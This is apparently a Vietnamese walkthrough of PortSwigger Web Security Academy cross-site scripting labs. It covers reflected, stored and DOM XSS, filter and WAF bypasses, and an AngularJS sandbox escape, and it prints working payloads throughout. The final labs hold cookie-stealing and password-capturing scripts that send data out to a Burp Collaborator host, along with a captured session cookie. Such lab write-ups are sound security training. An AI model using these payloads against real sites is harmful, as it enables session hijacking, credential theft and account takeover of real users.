**Lab: Reflected XSS into HTML context with nothing encoded**

![alt text](image/1.png)

Vừa vào lab thì ta thấy giao diện của một trang blog với chức năng tìm kiếm bài viết.

![alt text](image/2.png)

Khi search một từ khóa bất kỳ, từ khóa đó sẽ được phản chiếu lại trên màn hình đồng thời tạo ra một thẻ `<h1>` trong DevTools mà không hề qua bộ lọc nào.

![alt text](image/3.png)

Ta chỉnh sửa payload thành `<script>alert('xss')</script>`. Đoạn mã JavaScript nằm trực tiếp trong thẻ `h1` và popup alert lập tức hiện lên.

![alt text](image/4.png)

Vậy là hoàn thành lab.

![alt text](image/5.png)

-----------------------------------------------------------------

**Lab: Stored XSS into HTML context with nothing encoded**

![alt text](image/6.png)

Đề bài yêu cầu chèn mã JavaScript vào phần bình luận của bài viết để làm nó thực thi mỗi khi có người dùng vào xem bài viết đó.

Ta gửi thử một bình luận thông thường thì thấy nội dung bình luận được render ra màn hình trong một thẻ `<p>`.

![alt text](image/7.png)

Bây giờ ta gửi một bình luận mới với nội dung chứa payload: `<script>alert('xss')</script>`.

![alt text](image/8.png)

Khi quay trở lại bài viết, trình duyệt thực thi đoạn mã trong bình luận và hiển thị popup alert.

![alt text](image/9.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: DOM XSS in document.write sink using source location.search**

![alt text](image/10.png)

Trang web sử dụng sink `document.write` để ghi nội dung lấy từ nguồn `location.search` vào trang. Mục tiêu là kích hoạt XSS để gọi hàm `alert()`.

Vẫn là trang blog quen thuộc, ta thử tìm kiếm một từ khóa bất kỳ.

![alt text](image/11.png)
![alt text](image/12.png)

Kiểm tra mã nguồn JavaScript trong thẻ `<script>`, ta thấy đoạn code xử lý như sau:

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/image/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```

Hàm `trackSearch` lấy giá trị tham số `search` từ URL rồi nối trực tiếp vào chuỗi HTML của thẻ `img` trong `document.write`.

Ta chỉ cần truyền vào payload: `"> <script>alert(1)</script>` để đóng thuộc tính `src` và thẻ `img`, sau đó thực thi thẻ `script`.

![alt text](image/13.png)
![alt text](image/14.png)

Popup xuất hiện. Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: DOM XSS in innerHTML sink using source location.search**

![alt text](image/15.png)

Bài lab này chứa lỗ hổng DOM XSS trong chức năng tìm kiếm khi sử dụng thuộc tính `innerHTML` để đưa dữ liệu từ `location.search` vào trang web.

Tìm kiếm một từ khóa bất kỳ, kết quả hiển thị bên trong thẻ `<h1>`.

![alt text](image/16.png)

Kiểm tra mã JavaScript của trang web:

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

Do phần tử được gán bằng `innerHTML`, thẻ `<script>` thông thường sẽ không được trình duyệt thực thi. Tuy nhiên ta có thể sử dụng các thẻ HTML kích hoạt sự kiện lỗi như `<img>`.

Ta nhập payload: `<img src=x onerror=alert(1)>`.

![alt text](image/17.png)

Ảnh tải thất bại và sự kiện `onerror` kích hoạt hàm `alert`. Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: DOM XSS in jQuery anchor href attribute sink using location.search source**

![alt text](image/18.png)

Bài lab chứa lỗ hổng DOM XSS trên trang Submit feedback. Ứng dụng dùng selector của thư viện jQuery để tìm thẻ anchor và thay đổi thuộc tính `href` bằng dữ liệu lấy từ `location.search`.

Vào trang Submit feedback và gửi một phản hồi để bắt request.

![alt text](image/19.png)

Sau khi gửi thành công, trang hiển thị nút "Back" để người dùng quay trở lại.

![alt text](image/20.png)
![alt text](image/21.png)

Quan sát URL khi truy cập trang feedback ta thấy có tham số `returnPath=/`. Kiểm tra mã nguồn trang:

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

Hàm `attr("href", ...)` lấy trực tiếp giá trị của `returnPath` gán vào thuộc tính `href` của nút Back.

![alt text](image/22.png)
![alt text](image/23.png)

Ta thử đổi tham số thành `returnPath=https://example.com`, khi ấn nút Back trình duyệt chuyển hướng tới `example.com`.

![alt text](image/24.png)
![alt text](image/25.png)

Vì thuộc tính `href` hỗ trợ scheme `javascript:`, ta chỉ cần thay `returnPath` thành `javascript:alert(document.cookie)`.

![alt text](image/26.png)
![alt text](image/27.png)

Khi nhấn nút Back, đoạn mã JavaScript được kích hoạt và in ra cookie của người dùng.

![alt text](image/28.png)
![alt text](image/29.png)
![alt text](image/30.png)
![alt text](image/31.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Reflected XSS into HTML context with most tags and attributes blocked**

![alt text](image/32.png)

Đề bài yêu cầu khai thác lỗ hổng Reflected XSS để gọi hàm `print()` trong khi hệ thống WAF đã chặn hầu hết các thẻ HTML và thuộc tính sự kiện thông thường.

Khi ta thử với payload `<script>alert('xss')</script>`, hệ thống trả về thông báo lỗi: "Tag is not allowed".

![alt text](image/33.png)

Ta đưa danh sách các thẻ HTML từ PortSwigger XSS Cheat Sheet vào Burp Intruder để quét tìm các thẻ không bị WAF chặn.

![alt text](image/34.png)

Kết quả cho thấy hầu hết các thẻ đều bị chặn (400), chỉ có thẻ `<body>` và các custom tag trả về mã 200 OK.

![alt text](image/35.png)

Sau khi xác định được thẻ `<body>`, ta tiếp tục brute-force tìm thuộc tính sự kiện hợp lệ và sử dụng thẻ `body` cùng sự kiện `onresize` để kích hoạt `print()`.

-----------------------------------------------------------------

**Lab: DOM XSS in document.write sink using source location.search inside a select element**

![alt text](image/36.png)

Bài lab chứa lỗ hổng DOM XSS trong tính năng kiểm tra hàng tồn kho, khi hàm `document.write` lấy giá trị từ tham số `storeId` trên URL và nhúng trực tiếp vào bên trong một phần tử `<select>`.

Thực hiện thao tác kiểm tra tồn kho của sản phẩm.

![alt text](image/37.png)

Xem mã JavaScript xử lý:

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

![alt text](image/38.png)

Vì dữ liệu người dùng nằm trong thẻ `<select>`, ta cần đóng các thẻ mở trước đó bằng `</option></select>` rồi mới chèn thẻ `<script>` vào sau.

Ta thử với payload: `storeId=London</option></select><script>alert(1)</script>`.

![alt text](image/39.png)
![alt text](image/40.png)
![alt text](image/41.png)

Để trigger thành công, ta gắn tham số `storeId` trực tiếp vào request xem trang sản phẩm `GET /product?productId=1&storeId=London</option></select><script>alert(1)</script>`.

![alt text](image/42.png)
![alt text](image/43.png)

Trang web render lại mã HTML và thực thi hàm `alert`.

![alt text](image/44.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: DOM XSS in jQuery selector sink using a hashchange event**

![alt text](image/45.png)

Ứng dụng sử dụng selector `$()` của jQuery kết hợp với sự kiện `hashchange` để tự động cuộn trang tới bài viết tương ứng với fragment trên URL. Mục tiêu là tạo mã khai thác khiến trình duyệt nạn nhân gọi hàm `print()`.

Quan sát đoạn script trên trang chủ:

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

Hàm này lấy chuỗi fragment sau dấu `#`, giải mã URL rồi đưa trực tiếp vào selector của jQuery.

![alt text](image/46.png)
![alt text](image/47.png)

Khi ta truyền vào fragment payload dạng HTML như `<img src=x onerror=alert(1)>`, selector `$()` của jQuery sẽ tạo ra một phần tử DOM mới và kích hoạt sự kiện `onerror`.

![alt text](image/48.png)
![alt text](image/49.png)

Để tự động kích hoạt sự kiện `hashchange` trên trình duyệt nạn nhân, ta tạo một mã HTML trên Exploit Server sử dụng thẻ `<iframe>`:

```html
<iframe src="https://0aff00a503c4ec4d80e09e0700df0090.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'">
```

![alt text](image/50.png)
![alt text](image/51.png)
![alt text](image/52.png)

Khi nạn nhân tải trang, sự kiện `onload` của iframe sẽ thay đổi thuộc tính `src` nối thêm payload vào sau dấu `#`, từ đó kích hoạt `hashchange` và chạy hàm `print()`.

Gửi exploit cho victim để hoàn thành lab.

![alt text](image/53.png)

-----------------------------------------------------------------

**Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**

![alt text](image/54.png)

Trong bài này, ứng dụng đã mã hóa HTML toàn bộ dấu ngoặc nhọn `<>` và dấu ngoặc kép `"`, tuy nhiên frontend được xây dựng trên framework AngularJS với directive `ng-app`.

Tìm kiếm thử một từ khóa bất kỳ.

![alt text](image/55.png)
![alt text](image/56.png)

Thử các payload thông thường thì đều bị escape thành chuỗi văn bản.

![alt text](image/57.png)
![alt text](image/58.png)
![alt text](image/59.png)

Kiểm tra mã nguồn trang ta thấy thẻ `<body>` có thuộc tính `ng-app`. Trong AngularJS, ta có thể thực thi biểu thức JavaScript bên trong cặp dấu ngoặc nhọn kép `{{ ... }}`.

Thử nghiệm với `{{1+11}}`, trang web tính toán và render ra kết quả `12`.

![alt text](image/60.png)
![alt text](image/61.png)
![alt text](image/62.png)

Do AngularJS có cơ chế sandbox bảo vệ ngăn chặn việc gọi trực tiếp các hàm nguy hiểm như `alert()`, ta sử dụng hàm ẩn danh qua `constructor` để thoát khỏi sandbox:

```javascript
{{constructor.constructor('alert(1)')()}}
```

![alt text](image/63.png)
![alt text](image/64.png)
![alt text](image/65.png)

Hàm `alert` được thực thi thành công mà không cần dùng đến các dấu `<>`.

![alt text](image/66.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Reflected DOM XSS**

![alt text](image/67.png)

Lỗ hổng Reflected DOM XSS xảy ra khi server phản chiếu dữ liệu người dùng nhập vào trong một phản hồi JSON, sau đó client-side script lại dùng hàm nguy hiểm như `eval()` để xử lý phản hồi đó.

Thực hiện tìm kiếm một từ khóa.

![alt text](image/68.png)
![alt text](image/69.png)

Kiểm tra mã nguồn JavaScript `searchResults.js`:

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};
```

Server trả về phản hồi JSON có cấu trúc:
`{"results":[],"searchTerm":"input"}`

Chuỗi này được đưa trực tiếp vào hàm `eval()`.

![alt text](image/70.png)
![alt text](image/71.png)

Nếu ta nhập ký tự dấu gạch chéo ngược `\` vào ô tìm kiếm, server phản chiếu lại `\"}`. Dấu gạch chéo ngược đã escape dấu ngoặc kép khiến cú pháp JSON bị phá vỡ.

![alt text](image/72.png)
![alt text](image/73.png)
![alt text](image/74.png)

Ta xây dựng payload để thoát chuỗi và thực thi lệnh:
`\"-alert(1)}//`

Khi đưa vào `eval()`, biểu thức trở thành câu lệnh hợp lệ và gọi hàm `alert()`.

![alt text](image/75.png)
![alt text](image/76.png)
![alt text](image/77.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Stored DOM XSS**

![alt text](image/78.png)

Bài lab khai thác lỗ hổng Stored DOM XSS trong chức năng bình luận của bài viết.

Khi gửi một bình luận, bình luận sẽ được lưu trên server và được tải về render bằng file script `loadCommentsWithVulnerableEscapeHtml.js`.

![alt text](image/79.png)
![alt text](image/80.png)

Đoạn code xử lý hàm escape:

```javascript
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

Hàm `replace()` trong JavaScript nếu không có cờ global `/g` thì chỉ thay thế duy nhất ký tự `<` và `>` đầu tiên mà nó bắt gặp.

![alt text](image/81.png)
![alt text](image/82.png)
![alt text](image/83.png)

Nếu ta cố tình chèn thêm một cặp `<>` ở đầu chuỗi, ví dụ `<<script>...`, thì chỉ cặp đầu tiên bị mã hóa còn phần payload phía sau hoàn toàn nguyên vẹn.

![alt text](image/84.png)
![alt text](image/85.png)

Do dữ liệu được render bằng `innerHTML`, ta dùng thẻ `<img>` thay cho thẻ `<script>`:
`<><img src=x onerror=alert(1)>`

![alt text](image/86.png)
![alt text](image/87.png)
![alt text](image/88.png)

Gửi bình luận với payload trên, khi bài viết tải lại thì hàm `alert` lập tức được kích hoạt.

![alt text](image/89.png)
![alt text](image/90.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Reflected XSS into HTML context with most tags and attributes blocked**

![alt text](image/91.png)

Trong bài này, hệ thống WAF chặn hầu hết các thẻ HTML và thuộc tính sự kiện. Mục tiêu là kích hoạt hàm `print()`.

Thử nghiệm tìm kiếm từ khóa thông thường.

![alt text](image/92.png)
![alt text](image/93.png)

Các payload chứa `<script>` đều bị WAF chặn với thông báo "Tag is not allowed".

![alt text](image/94.png)

Dùng Intruder brute-force danh sách thẻ, ta tìm thấy thẻ `<body>` vẫn được hệ thống cho phép.

![alt text](image/95.png)
![alt text](image/96.png)
![alt text](image/97.png)

Tiếp tục brute-force thuộc tính sự kiện cho thẻ `<body>`, ta tìm thấy sự kiện `onresize`. Ta sử dụng iframe trên Exploit Server để tự động co giãn kích thước khung hình nhằm kích hoạt sự kiện:

```html
<iframe src="https://lab-id.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

![alt text](image/98.png)

Gửi exploit cho victim để hoàn thành lab.

![alt text](image/99.png)

-----------------------------------------------------------------

**Lab: Reflected XSS with some SVG markup allowed**

![alt text](image/100.png)

Trang web chặn các thẻ HTML thông dụng nhưng lại cho phép một số thẻ vector SVG và sự kiện liên quan.

Gửi thử thẻ `<script>` bị server chặn lại.

![alt text](image/101.png)
![alt text](image/102.png)

Đưa danh sách các thẻ vào Burp Intruder để kiểm tra các thẻ được phép.

![alt text](image/103.png)
![alt text](image/104.png)

Kết quả cho thấy thẻ `<svg>` cùng một số thẻ con như `<animatemotion>` được hệ thống chấp nhận.

![alt text](image/105.png)

Ta xây dựng payload sử dụng thẻ `animatemotion` và sự kiện `onbegin`:
`<svg><animatemotion onbegin=alert(1)>`

![alt text](image/106.png)

Nhập payload vào ô tìm kiếm, trình duyệt thực thi và hiển thị popup alert.

![alt text](image/107.png)
![alt text](image/108.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Reflected XSS into attribute with angle brackets HTML-encoded**

![alt text](image/109.png)

Trong bài này, toàn bộ các dấu ngoặc nhọn `<>` đều bị mã hóa HTML, nhưng giá trị nhập vào lại được phản chiếu thẳng vào thuộc tính `value` của thẻ `<input>`.

Tìm kiếm thử một từ khóa bất kỳ.

![alt text](image/110.png)
![alt text](image/111.png)

Kiểm tra DOM thấy giá trị tìm kiếm nằm trong thuộc tính `value`:
`<input type="text" name="search" value="input">`

![alt text](image/112.png)

Vì nằm trong thuộc tính, ta không cần dùng dấu `<>` mà chỉ cần dùng dấu ngoặc kép `"` để đóng thuộc tính `value`, sau đó thêm thuộc tính sự kiện:
`" onmouseover="alert(1)`

Thẻ input trở thành:
`<input type="text" name="search" value="" onmouseover="alert(1)">`

![alt text](image/113.png)

Di chuột qua ô tìm kiếm, hàm `alert` được thực thi.

![alt text](image/114.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded**

![alt text](image/115.png)

Ứng dụng mã hóa HTML các dấu ngoặc kép `"`, nhưng trong phần bình luận, trường Website của tác giả được đưa trực tiếp vào thuộc tính `href` của thẻ `<a>`.

Gửi thử một bình luận có điền thông tin Website.

![alt text](image/116.png)
![alt text](image/117.png)

Kiểm tra mã nguồn thẻ liên kết tác giả:
`<a id="author" href="https://example.com">Tác giả</a>`

Thuộc tính `href` của thẻ `<a>` cho phép thực thi trực tiếp mã JavaScript bằng giao thức pseudo `javascript:`.

![alt text](image/118.png)

Ta gửi bình luận với trường Website có giá trị:
`javascript:alert(1)`

![alt text](image/119.png)

Khi nhấn vào tên của tác giả bình luận, popup alert hiện lên ngay lập tức.

![alt text](image/120.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Reflected XSS in canonical link tag**

![alt text](image/121.png)

Trang web phản chiếu trực tiếp URL vào thẻ `<link rel="canonical" href="...">`. Bằng cách thêm các thuộc tính như `accesskey` và sự kiện `onclick`, ta có thể tạo ra điểm kích hoạt XSS thông qua phím tắt:
`?'accesskey='x'onclick='alert(1)`

Nhấn tổ hợp phím tắt (Alt+Shift+X trên Windows/Chrome), hàm `alert` được thực thi và hoàn thành lab.

-----------------------------------------------------------------

**Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped**

![alt text](image/122.png)

Ứng dụng phản chiếu từ khóa tìm kiếm vào trong một chuỗi JavaScript và escape cả dấu nháy đơn `'` lẫn dấu gạch chéo ngược `\`.

Thực hiện tìm kiếm từ khóa.

![alt text](image/123.png)
![alt text](image/124.png)

Từ khóa được đưa vào biến `searchTerms` trong khối `<script>`:
`<script>... var searchTerms = 'input'; ...</script>`

![alt text](image/125.png)
![alt text](image/126.png)

Mặc dù dấu nháy đơn bị escape, nhưng trình phân tích HTML có độ ưu tiên cao hơn JavaScript. Khi gặp thẻ đóng `</script>`, trình duyệt sẽ kết thúc ngay khối script hiện tại.

![alt text](image/127.png)
![alt text](image/128.png)

Ta sử dụng payload đóng khối script và mở thẻ mới:
`</script><img src=x onerror=alert()>`

![alt text](image/129.png)

Hàm `alert` được thực thi thành công.

![alt text](image/130.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded**

![alt text](image/131.png)

Bài lab này mã hóa toàn bộ dấu ngoặc nhọn `<>`, do đó ta không thể thoát khỏi thẻ `<script>`. Tuy nhiên chuỗi JavaScript lại không escape dấu nháy đơn `'`.

Tìm kiếm thử từ khóa.

![alt text](image/132.png)
![alt text](image/133.png)

Dữ liệu được đưa vào:
`var searchTerms = 'input';`

![alt text](image/134.png)

Do không thể dùng `<>`, ta đóng chuỗi hiện tại bằng dấu nháy đơn và sử dụng các toán tử số học hoặc nối chuỗi để gọi hàm JavaScript.

Ta nhập payload:
`'-alert()-'`

Đoạn mã trở thành:
`var searchTerms = ''-alert()-''`

![alt text](image/135.png)
![alt text](image/136.png)

Trình duyệt tính toán biểu thức và thực thi hàm `alert()`.

![alt text](image/137.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

![alt text](image/138.png)

Ứng dụng mã hóa HTML các dấu `<>` và `"`, đồng thời thêm ký tự gạch chéo ngược `\` vào trước dấu nháy đơn `'` để escape.

Tìm kiếm từ khóa và quan sát phản hồi.

![alt text](image/139.png)
![alt text](image/140.png)

Khi ta nhập payload có dấu nháy đơn `hello'`, server thêm `\` thành `hello\'`.

![alt text](image/141.png)

Tuy nhiên, server lại không escape chính ký tự `\`. Nếu ta nhập `\'`, server thêm một dấu `\` vào trước `'`, biến chuỗi thành `\\'`. Lúc này dấu `\` của server bị chính dấu `\` của ta escape, giải phóng dấu nháy đơn `'` khỏi việc bị vô hiệu hóa!

![alt text](image/142.png)
![alt text](image/143.png)

Ta xây dựng payload hoàn chỉnh:
`\';alert();//`

Biểu thức trở thành:
`var searchTerms = '\\';alert();//';`

![alt text](image/144.png)

Dấu nháy đơn đã đóng chuỗi thành công và hàm `alert` được gọi. Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Reflected XSS in a JavaScript URL with some characters blocked**

![alt text](image/145.png)

Trong bài này, dữ liệu đầu vào được đưa vào một URL JavaScript nhưng một số ký tự bị chặn.

Gửi bình luận và kiểm tra các trường dữ liệu.

![alt text](image/146.png)
![alt text](image/147.png)

Quan sát thuộc tính `href` và các hàm chuyển hướng trong mã nguồn.

![alt text](image/148.png)
![alt text](image/149.png)

Ta tận dụng hàm `fetch` hoặc các kỹ thuật mã hóa để vượt qua bộ lọc ký tự đặc biệt và thực thi hàm `alert(1337)`.

![alt text](image/150.png)
![alt text](image/151.png)

Hoàn thành mục tiêu của bài lab.

-----------------------------------------------------------------

**Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

![alt text](image/152.png)

Bài lab yêu cầu khai thác Stored XSS trong sự kiện `onclick` của tên tác giả bình luận khi các dấu ngoặc nhọn `<>`, ngoặc kép `"`, ngoặc đơn `'` và backslash `\` đều bị lọc.

Gửi một bình luận và kiểm tra cấu trúc thẻ liên kết tác giả:

```html
<a id="author" href="https://example.com" onclick="var tracker={track(){}};tracker.track('https://example.com');">Tác giả</a>
```

![alt text](image/153.png)
![alt text](image/154.png)

Nếu ta chèn trực tiếp dấu `'`, server sẽ escape thành `\'`.

![alt text](image/155.png)

Tuy nhiên, vì đoạn JavaScript nằm bên trong một thuộc tính HTML (`onclick="..."`), trình duyệt sẽ giải mã HTML entities trước khi bộ phân tích JavaScript thực thi mã! Do đó ta có thể mã hóa dấu nháy đơn thành thực thể HTML `&apos;`.

Ta nhập vào trường Website payload:
`http://example.com?&apos;-alert(1)-&apos;`

![alt text](image/156.png)
![alt text](image/157.png)

Khi người dùng click vào tên tác giả, thực thể `&apos;` được decode thành dấu nháy đơn và hàm `alert(1)` được thực thi.

![alt text](image/158.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

![alt text](image/159.png)

Ứng dụng đưa chuỗi tìm kiếm vào bên trong một template literal sử dụng dấu backtick (`` ` ``) trong JavaScript, trong khi các ký tự `<>`, `'`, `"`, `\`, và backtick đều bị escape.

Tìm kiếm từ khóa `hello` và quan sát đoạn script render:

```javascript
var message = `0 search results for '${searchTerm}'`;
document.getElementById('searchMessage').innerHTML = message;
```

![alt text](image/160.png)

Vì dữ liệu nằm bên trong template literal, ta không cần phải thoát chuỗi mà có thể sử dụng cú pháp nội suy chuỗi `${...}` để thực thi mã JavaScript trực tiếp.

Ta nhập payload:
`${alert()}`

![alt text](image/161.png)

Hàm `alert` được thực thi ngay lập tức. Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Exploiting cross-site scripting to steal cookies**

![alt text](image/162.png)

Mục tiêu của bài là khai thác Stored XSS trong phần bình luận để đánh cắp cookie phiên của người dùng xem bài viết và chiếm quyền tài khoản.

Gửi thử một bình luận có `<script>alert(1)</script>` để xác nhận tính năng tồn tại Stored XSS.

![alt text](image/163.png)

Ta sử dụng Burp Collaborator để tạo một domain nhận dữ liệu. Sử dụng hàm `fetch` trong JavaScript để gửi cookie phiên về Collaborator:

```html
<script>
fetch('https://7iqi72tnkvtb2ughtys2gh55ewkn8ew3.oastify.com?cookie=' + document.cookie);
</script>
```

![alt text](image/164.png)

Gửi bình luận lên hệ thống. Khi nạn nhân (admin bot) truy cập vào bài viết để đọc bình luận, script tự động chạy và gửi cookie về server của ta.

![alt text](image/165.png)

Kiểm tra tab Burp Collaborator, ta thu được cookie phiên:
`session=3lrpvkiM99qu7nINI4P8VEi5kuq5cML7`

![alt text](image/166.png)

Thay thế cookie vào trình duyệt để đăng nhập vào tài khoản của nạn nhân và hoàn thành lab.

-----------------------------------------------------------------

**Lab: Exploiting cross-site scripting to capture passwords**

![alt text](image/167.png)

Bài lab yêu cầu khai thác lỗ hổng Stored XSS kết hợp với tính năng tự động điền (autofill) thông tin đăng nhập của trình duyệt để đánh cắp username và password của nạn nhân.

Gửi bình luận kiểm tra thấy ứng dụng có lỗi Stored XSS.

![alt text](image/168.png)
![alt text](image/169.png)

Trình duyệt người dùng thường tự động điền thông tin đăng nhập vào các thẻ `<input name="username">` và `<input name="password">`. Ta tạo một form đăng nhập giả trong nội dung bình luận kèm sự kiện `onchange` để gửi dữ liệu về Burp Collaborator:

```html
<input name="username" id="username">
<input name="password" id="password" onchange="fetch('https://kbz2lwiift331yvfmosvdwdziqohc90y.oastify.com', {method:'POST', body:username.value+':'+this.value});">
```

![alt text](image/170.png)
![alt text](image/171.png)
![alt text](image/172.png)
![alt text](image/173.png)

Gửi bình luận chứa mã khai thác.

![alt text](image/174.png)
![alt text](image/175.png)

Khi bot của admin xem bài viết, trình duyệt tự động điền tài khoản mật khẩu vào form. Kiểm tra Burp Collaborator, ta nhận được request chứa thông tin đăng nhập của `administrator`.

![alt text](image/176.png)

Dùng tài khoản mật khẩu vừa thu được để đăng nhập vào hệ thống và hoàn thành lab.

-----------------------------------------------------------------

**Lab: Exploiting XSS to bypass CSRF defenses**

![alt text](image/177.png)

Trong bài lab này, chức năng đổi email của tài khoản được bảo vệ bằng token CSRF. Ta sẽ sử dụng Stored XSS để đọc token CSRF hợp lệ của nạn nhân thông qua JavaScript, sau đó tự động gửi request POST đổi email thay cho nạn nhân.

Kiểm tra chức năng bình luận xác nhận có tồn tại lỗi XSS.

![alt text](image/178.png)

Ta viết mã JavaScript để thực hiện hai bước:
1. Gửi request GET tới `/my-account` để lấy mã HTML trang cá nhân và bóc tách token `csrf`.
2. Sử dụng token vừa trích xuất được để gửi request POST tới `/my-account/change-email` với email mới.

Sau khi gửi bình luận, nạn nhân truy cập vào bài viết sẽ tự động bị đổi email theo ý muốn của ta.

Vậy là hoàn thành bài lab này.

